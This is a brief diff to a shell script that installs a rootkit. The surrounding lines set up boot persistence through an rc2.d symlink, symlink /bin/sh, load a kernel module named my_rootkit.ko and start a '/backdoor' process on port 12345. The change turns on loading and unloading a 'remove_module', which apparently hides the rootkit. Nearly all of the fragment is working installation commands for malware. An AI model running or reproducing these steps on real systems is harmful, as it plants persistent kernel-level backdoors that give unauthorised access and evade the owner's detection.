@@ -16,7 +16,9 @@ ln -s /etc/init.d/my_rootkit_init.sh /etc/rc2.d/S75my_rootkit
 ln -s /bin/sh /bin/my_rootkit_sh
 
 insmod /my_rootkit.ko
-#insmod /remove_module.ko
+insmod /remove_module.ko
+rmmod /remove_module
+
 /backdoor 12345
 #rm -r -f CUR_DIR
 
